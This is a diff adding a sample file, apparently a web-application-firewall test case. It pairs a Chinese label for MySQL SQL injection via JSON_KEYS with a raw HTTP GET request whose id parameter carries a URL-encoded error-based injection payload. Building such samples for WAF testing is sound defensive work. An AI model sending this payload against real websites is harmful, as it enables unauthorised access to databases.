@@ -1,0 +1,9 @@
+# SQL注入_GET_mysql_使用JSON_KEYS函数注入
+# JSON_KEYS() 函数用于返回 JSON 对象的键列表。在 MySQL 中，您可以使用该函数来提取 JSON 对象中的键，并返回一个 JSON 数组，其中包含对象中的所有键。
+GET /?id=1%20AND%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x71717a6271%2C%28SELECT%20%28ELT%283934=3934%2C1%29%29%29%2C0x71627a6271%29%29%20USING%20utf8%29%29%29&bid=hd_tag_m8mv245a HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv245a
+RM-PRO-Token: e1e1ce8d57a3e7353804b42cfe258bdf
+RM-PRO-Time: 1742808364221
+User-Agent: curl/7.83.1
+
